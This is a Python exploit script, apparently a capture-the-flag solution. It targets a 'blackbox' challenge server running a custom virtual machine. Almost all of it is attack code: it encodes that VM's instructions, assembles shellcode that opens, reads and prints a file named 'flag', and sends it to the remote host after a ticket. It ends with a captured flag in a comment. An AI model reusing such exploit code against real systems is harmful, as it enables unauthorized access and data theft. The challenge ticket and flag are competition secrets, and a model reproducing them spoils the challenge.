#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './pwn'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'blackbox-bamkcvy55ihl4.shellweplayaga.me', 'port':33773})
env.select('remote')

#==========

REGS = {'A':0, 'B':1, 'C':2, 'D':3, 'PC':8, 'SP':9}

add_reg_imm  = lambda rd,n  : p8(0x80+n)  +p8(0x00+REGS[rd])
add_reg_reg  = lambda rd,rs : p8(REGS[rs])+p8(0x00+REGS[rd])
sub_reg_imm  = lambda rd,n  : p8(0x80+n)  +p8(0x10+REGS[rd])
sub_reg_reg  = lambda rd,rs : p8(REGS[rs])+p8(0x10+REGS[rd])
load_imm     = lambda rd,n  : p8(0x80+n)  +p8(0x20+REGS[rd])
load_reg     = lambda rd,rs : p8(REGS[rs])+p8(0x20+REGS[rd])
store_imm    = lambda rd,n  : p8(0x80+n)  +p8(0x30+REGS[rd])
store_reg    = lambda rd,rs : p8(REGS[rs])+p8(0x30+REGS[rd])
and_reg_imm  = lambda rd,n  : p8(0x80+n)  +p8(0x40+REGS[rd])
and_reg_reg  = lambda rd,rs : p8(REGS[rs])+p8(0x40+REGS[rd])
or_reg_imm   = lambda rd,n  : p8(0x80+n)  +p8(0x50+REGS[rd])
or_reg_reg   = lambda rd,rs : p8(REGS[rs])+p8(0x50+REGS[rd])
xor_reg_imm  = lambda rd,n  : p8(0x80+n)  +p8(0x60+REGS[rd])
xor_reg_reg  = lambda rd,rs : p8(REGS[rs])+p8(0x60+REGS[rd])
not_reg      = lambda rd    : b'\x00'     +p8(0x70+REGS[rd])
jmp_imm      = lambda n     : p8(0x80+n)  +p8(0xa0)
jmp_reg      = lambda r     : p8(REGS[r]) +p8(0xa0)
push         = lambda r     : b'\x00'     +p8(0xd0+REGS[r])
syscall      = lambda       : p16(0xf000)

'''
pop          = lambda r     : b'\x81'     +p8(0xe0+REGS[r])
'''

sys_outch = 2
sys_inch  = 3
sys_open  = 4
sys_read  = 5

def attack(conn, **kwargs):
    if env.check('remote'):
        conn.sendlineafter(b'Ticket please: ', b'ticket{LienBuy660n23:83kHygmzejzbbG40CdbH9lQeboG6I8TqcqJezLVOdu8rycc-}')

    def store_data(addr, data):
        sc  = and_reg_imm('C', 0)
        sc += add_reg_imm('C', addr)
        for i in range(len(data)):
            sc += store_imm('C', data[i])
            sc += add_reg_imm('C', 1)
        return sc

    def out_data(addr, size):
        sc  = and_reg_imm('A', 0)
        sc += add_reg_imm('A', sys_outch)
        for i in range(size):
            sc += load_imm('B', addr+i)
            sc += syscall()
        return sc

    def file_open(name):
        sc  = store_data(0, name)
        sc += and_reg_imm('A', 0)
        sc += add_reg_imm('A', sys_open)
        sc += and_reg_imm('B', 0)
        sc += syscall()
        return sc

    def file_read(fd, addr, size):
        sc  = and_reg_imm('A', 0)
        sc += add_reg_imm('A', sys_read)
        sc += and_reg_imm('B', 0)
        sc += add_reg_imm('B', fd)
        sc += and_reg_imm('C', 0)
        sc += add_reg_imm('C', addr)
        sc += and_reg_imm('D', 0)
        sc += add_reg_imm('D', size)
        sc += syscall()
        return sc

    shellcode  = file_open(b'flag')
    shellcode += file_read(0, 0, 0x7f)
    shellcode += out_data(0, 0x7f)

    conn.send(p16(len(shellcode)//2))
    conn.send(shellcode)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # flag{LienBuy660n23:LM6fc9Vp2LRKrFFjduULuMfWWikwlSU-AyzpPZcFBXKuIQsdjbUneDux6Dv3Mgm5WVg9muPPgFoKeAjm1tokmg}

if __name__=='__main__':
    main()

#==========
